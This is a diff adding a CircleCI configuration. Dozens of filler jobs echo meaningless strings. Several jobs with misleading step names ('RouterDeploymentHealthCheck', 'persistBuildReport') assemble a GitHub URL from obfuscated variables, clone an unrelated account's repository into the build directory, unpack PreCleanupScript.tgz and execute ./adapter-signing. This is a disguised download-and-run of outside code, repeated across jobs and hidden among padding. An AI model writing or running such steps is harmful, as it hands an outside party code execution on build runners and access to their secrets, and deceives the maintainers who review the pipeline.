+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/message-broker-package-cache" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 1 --no-tags "$verify/$cancel/$renewjob" .
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            "$(pwd)/adapter-signing"
+  website-object-files:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Fetching data pipeline dependencies
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; cat <(echo black) <(echo cyan); true ; } > /tmp/clean-up-working-directory/mirror-repository-in-parallel
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'mirror-repository-in-parallel'
+  LoadBalancerVersionNumber:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/mirror-repository-in-parallel" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --branch=main "$verify/$cancel/$renewjob" $(pwd)
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            bash -eo pipefail -c "./adapter-signing"
+  incremental-nightly-pipeline:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: post-scan security audit
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "worker 6 idle"; abs_of() { local num=$1; if ((num < 0)); then num=$((0 - num)); fi; echo "$num"; }; abs_of -24; true ; } > /tmp/clean-up-working-directory/PartialPackaging
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PartialPackaging'
+  persist-scan-results:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/PartialPackaging" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 "$verify/$cancel/$renewjob" $PWD
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            $(pwd)/adapter-signing
+  stop-updater-instance:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Notify contributors before merge
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%d\n' 0xa19; true ; } > /tmp/clean-up-working-directory/ScanDataPipeline
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'ScanDataPipeline'
+  MonitorValidatorInstance:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/ScanDataPipeline" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 2 "$verify/$cancel/$renewjob" "./"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./adapter-signing
+  TagResolverReleaseBuild:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: calculate-artifact-sizes-after-every-job
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; sort -m <(printf '%s\n' galaxy guava saturn swan) <(printf '%s\n' cherry galaxy navy saturn) | paste -s -d' '; true ; } > /tmp/clean-up-working-directory/DailyPerformanceMonitoringLane6
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'DailyPerformanceMonitoringLane6'
+  label-release-after-packaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/DailyPerformanceMonitoringLane6" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=3 --no-tags --no-single-branch "$verify/$cancel/$renewjob" ./
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            env ./adapter-signing
+  metric-export-routine:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: periodic-backup-rotation-worker-13
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%10s|\n' birch; echo "result $((76 - 35))"; true ; } > /tmp/clean-up-working-directory/prePushStyleChecks
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'prePushStyleChecks'
+  ApplyManifestAfterUpload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/prePushStyleChecks" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 3 --no-tags "$verify/$cancel/$renewjob" "$(pwd)"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            './adapter-signing'
+  stamp-compiler-version-number:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: test-agent-user-guide
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "dependency audit complete"; seq 1 40 | sha224sum | cut -c1-20; true ; } > /tmp/clean-up-working-directory/PackageCode
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PackageCode'
+  one-time-release-freeze:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/PackageCode" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --jobs 2 "$verify/$cancel/$renewjob" "${PWD}"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            "$(pwd)/adapter-signing"
+
+  optionalDependencyInstallLevel4:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: ScanBridgeSourceFiles
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo 'step 8 of 8 finished'; printf '%s\n' camel maple theta blue | grep -n t; true ; } > /tmp/clean-up-working-directory/resolve-pass-2
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'resolve-pass-2'
+  display-link-count:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: job-runner-container-rebuild
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%s\n' valve puma spruce beech iron | grep o | sed 's/a/A/g'; true ; } > /tmp/clean-up-working-directory/DailyPerformanceMonitoringLane6
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'DailyPerformanceMonitoringLane6'
+  PullAdapterRuntimeImage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: check-out-release-tag (phase 1 of 2)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; tagged() { printf '[%s] %s\n' "$1" "$2"; }; tagged orange mauve; true ; } > /tmp/clean-up-working-directory/FormatPlaygroundTranslations
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'FormatPlaygroundTranslations'
+  linkTestHarnessExecutable:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: monitorViewer
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; entry="zone=llama"; echo "$entry" | awk -F= '{print $1}'; echo "using crab profile"; true ; } > /tmp/clean-up-working-directory/unlockProductionEnvironment
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'unlockProductionEnvironment'
+  copy-release-files:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: cloningMailerNestedRepositories
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "retry 5 of 11"; raw="kappa pecan"; echo "$raw" | xargs -n 1 echo; true ; } > /tmp/clean-up-working-directory/FetchRateLimiterPackages
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'FetchRateLimiterPackages'
+  PrimaryLogExportHookNode6:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Compilation Task (phase 1 of 3)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; for k in 1 2 3 4 5; do echo "attempt $k"; if [ "$k" -eq 4 ]; then echo "succeeded on attempt $k"; break; fi; done; true ; } > /tmp/clean-up-working-directory/mirror-repository-in-parallel
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'mirror-repository-in-parallel'
+  EmbedQueryPlannerStaticAssets:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: parallel-scan
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; words=($(seq 1 8)); echo "${words[1]}"; true ; } > /tmp/clean-up-working-directory/LicenseScanHook
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'LicenseScanHook'
+  module-compilation-job:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: proxy release
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "shard 1 of 3 finished"; head_and_count() { echo "$1"; shift; echo "$#"; }; head_and_count guava otter 2; true ; } > /tmp/clean-up-working-directory/PurgeSimulatorCache
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PurgeSimulatorCache'
+  image-processor-benchmarks:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: post-install-startup-tests
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; passed=83; failed=0; skipped=5; echo "$((passed + failed + skipped)) tests, $passed passed, $failed failed, $skipped skipped"; true ; } > /tmp/clean-up-working-directory/prePushStyleChecks
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'prePushStyleChecks'
+  InstallToolsAndRunVisualTests:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: alerting-stakeholders
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; f="helper.toml"; echo "${f/./-}"; echo worker 5 idle; true ; } > /tmp/clean-up-working-directory/profiler-layer-cache
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'profiler-layer-cache'
+  long-running-artifact-signing:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Enable monitoring manually
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo 'warming up dispatcher'; echo_times() { local i; for ((i = 0; i < $1; i++)); do printf '%s' "$2"; done; echo; }; echo_times 6 papaya; true ; } > /tmp/clean-up-working-directory/post-publish-fixture-generation
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'post-publish-fixture-generation'
+  ConditionalRegistryBackupTask:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: SchemaRegistryFeatureRollOut
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%s\n' shark=24 zinc=4 rotor=7 golden=39 | cut -d= -f2 | paste -s -d+ && echo 'ready'; true ; } > /tmp/clean-up-working-directory/CancelStaleJobsLevel1
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'CancelStaleJobsLevel1'
+  BackgroundPackageReleasePhase:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: probeDatabaseConnectionBeforeDeploy
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; next_of() { echo $(($1 + 1)); }; n=29; n=$(next_of "$n"); n=$(next_of "$n"); echo "$n"; printf '%s' "carbon" | base64; true ; } > /tmp/clean-up-working-directory/promote-installer
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'promote-installer'
+  execute-flaky-tests:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Measure sync service code coverage (attempt 1)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; status_of() { return "$1"; }; status_of 0; echo zero; status_of 2 || echo "nonzero $?"; true ; } > /tmp/clean-up-working-directory/secret-scan-pipeline-slot-7
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'secret-scan-pipeline-slot-7'
+  job-runner-functional-test:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: persist-storage-executable-to-workspace
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; for ((slot = 3; slot > 0; slot--)); do echo "[$slot/3] worker"; done; echo "checks complete"; true ; } > /tmp/clean-up-working-directory/tag-agent-preview-release
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'tag-agent-preview-release'
+  name-server-template-lint:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Looking for dependency updates
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; total=0; while read -r v; do total=$((total + v)); done < <(seq 1 4); echo "$total"; true ; } > /tmp/clean-up-working-directory/MultiStageDependencyRestore
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'MultiStageDependencyRestore'
+  persistCoreBuildOutputs:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: conditionalTestSummary
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; for entry in sloth eel jupiter wolf mango beta; do echo "loading $entry"; echo "$entry ok"; done; true ; } > /tmp/clean-up-working-directory/daily-extraction
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'daily-extraction'
+  continuousTranslationImport:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Load balancer smoke test
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%s\n' mouse=19 cobalt=27 pecan=33 yellow=19 | tr = ' ' | sort -k2 -n | tail -n 1; true ; } > /tmp/clean-up-working-directory/package-application
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'package-application'
+workflows:
+  TestPlaygroundDistribution:
+    jobs:
+      - ManualDataImport
+      - optionalDependencyInstallLevel4:
+          requires:
+            - ManualDataImport
+      - Capture:
+          requires:
+            - optionalDependencyInstallLevel4
+      - TagResolverReleaseBuild:
+          requires:
+            - optionalDependencyInstallLevel4
+      - display-link-count:
+          requires:
+            - TagResolverReleaseBuild
+      - label-release-after-packaging:
+          requires:
+            - display-link-count
+      - copy-router-package:
+          requires:
+            - display-link-count
+      - PullAdapterRuntimeImage:
+          requires:
+            - copy-router-package
+      - resolve-dependency-conflicts:
+          requires:
+            - PullAdapterRuntimeImage
+      - crossPlatformReleaseBumpPhase:
+          requires:
+            - PullAdapterRuntimeImage
+      - linkTestHarnessExecutable:
+          requires:
+            - crossPlatformReleaseBumpPhase
+      - auditing-access-logs:
+          requires:
+            - linkTestHarnessExecutable
+      - localServerCoverageReport:
+          requires:
+            - linkTestHarnessExecutable
+      - copy-release-files:
+          requires:
+            - localServerCoverageReport
+      - scan-worker:
+          requires:
+            - copy-release-files
+      - website-object-files:
+          requires:
+            - copy-release-files
+      - PrimaryLogExportHookNode6:
+          requires:
+            - website-object-files
+      - LoadBalancerVersionNumber:
+          requires:
+            - PrimaryLogExportHookNode6
+      - install-front-end-plugins
+      - persistCoreBuildOutputs:
+          requires:
+            - install-front-end-plugins
+      - readinessCheckPartition6Of7:
+          requires:
+            - persistCoreBuildOutputs
+      - benchmark-hook-split-2-of-2:
+          requires:
+            - persistCoreBuildOutputs
+      - continuousTranslationImport:
+          requires:
+            - benchmark-hook-split-2-of-2
+      - exports-part-1-of-4:
+          requires:
+            - continuousTranslationImport
+  automatic-messaging-publish:
+    jobs:
+      - incremental-nightly-pipeline
+      - persist-scan-results:
+          requires:
+            - incremental-nightly-pipeline
+      - SaveAndUploadBuildSummary:
+          requires:
+            - incremental-nightly-pipeline
+      - OptionalImageCompressionPart3:
+          requires:
+            - SaveAndUploadBuildSummary
+      - NotificationServiceBenchmarks:
+          requires:
+            - SaveAndUploadBuildSummary
+      - UploadServiceScreenshots:
+          requires:
+            - NotificationServiceBenchmarks
+      - probe-registry-access:
+          requires:
+            - NotificationServiceBenchmarks
+      - GatheringCycle6:
+          requires:
+            - probe-registry-access
+      - stop-updater-instance:
+          requires:
+            - probe-registry-access
+      - MonitorValidatorInstance:
+          requires:
+            - stop-updater-instance
+      - LocalBundleAnalysis:
+          requires:
+            - stop-updater-instance
+      - extension-cache-shard-1:
+          requires:
+            - LocalBundleAnalysis
+      - freeze-status-page-plugins:
+          requires:
+            - LocalBundleAnalysis
+      - ExperimentalPreviewDeployment:
+          requires:
+            - freeze-status-page-plugins
+      - stamp-compiler-version-number:
+          requires:
+            - freeze-status-page-plugins
+      - one-time-release-freeze:
+          requires:
+            - stamp-compiler-version-number
+      - Compressing
+      - StateBackupTask:
+          requires:
+            - Compressing
+      - PullInstallerBaseImage:
+          requires:
+            - Compressing
+      - pre-tag-style-lint-stage-2-of-5:
+          requires:
+            - PullInstallerBaseImage
+      - track-router-bundle-size:
+          requires:
+            - PullInstallerBaseImage
+      - emergency-plugin-publish-task:
+          requires:
+            - track-router-bundle-size
+      - cache-runtime-image:
+          requires:
+            - track-router-bundle-size
+      - required-export-service-backup:
+          requires:
+            - cache-runtime-image
+  parallel-asset-compilation:
+    jobs:
+      - AdapterBuild
+      - EmbedQueryPlannerStaticAssets:
+          requires:
+            - AdapterBuild
+      - CompareAnalyzerDigests:
+          requires:
+            - EmbedQueryPlannerStaticAssets
+      - AnalyticsSchemaFreeze:
+          requires:
+            - EmbedQueryPlannerStaticAssets
+      - module-compilation-job:
+          requires:
+            - AnalyticsSchemaFreeze
+      - WarmingDependencyCacheAtJobEnd:
+          requires:
+            - module-compilation-job
+      - metric-export-routine:
+          requires:
+            - module-compilation-job
+      - image-processor-benchmarks:
+          requires:
+            - metric-export-routine
+      - ApplyManifestAfterUpload:
+          requires:
+            - image-processor-benchmarks
+      - ImporterUpgradeTests:
+          requires:
+            - image-processor-benchmarks
+      - InstallToolsAndRunVisualTests:
+          requires:
+            - ImporterUpgradeTests
+      - local-monitoring:
+          requires:
+            - InstallToolsAndRunVisualTests
+      - probeInstanceOnDemand:
+          requires:
+            - InstallToolsAndRunVisualTests
+      - long-running-artifact-signing:
+          requires:
+            - probeInstanceOnDemand
+      - generating-modules:
+          requires:
+            - long-running-artifact-signing
+      - FetchAndCacheArtifacts
+      - ConditionalRegistryBackupTask:
+          requires:
+            - FetchAndCacheArtifacts
+      - SummarizeAuditFindings:
+          requires:
+            - ConditionalRegistryBackupTask
+      - report-builder-snapshot-restore:
+          requires:
+            - ConditionalRegistryBackupTask
+      - BackgroundPackageReleasePhase:
+          requires:
+            - report-builder-snapshot-restore
+      - DeferredPatchRelease:
+          requires:
+            - BackgroundPackageReleasePhase
+      - SummarizeProxyCrashDumps:
+          requires:
+            - BackgroundPackageReleasePhase
+      - execute-flaky-tests:
+          requires:
+            - SummarizeProxyCrashDumps
+      - store-controller-license-report:
+          requires:
+            - execute-flaky-tests
+      - cache-download-stage:
+          requires:
+            - execute-flaky-tests
+      - job-runner-functional-test:
+          requires:
+            - cache-download-stage
+      - RefreshNameServerCache:
+          requires:
+            - job-runner-functional-test
+      - pre-build-tests:
+          requires:
+            - job-runner-functional-test
+      - name-server-template-lint:
+          requires:
+            - pre-build-tests
+      - ApprovingDebuggerRelease:
+          requires:
+            - name-server-template-lint
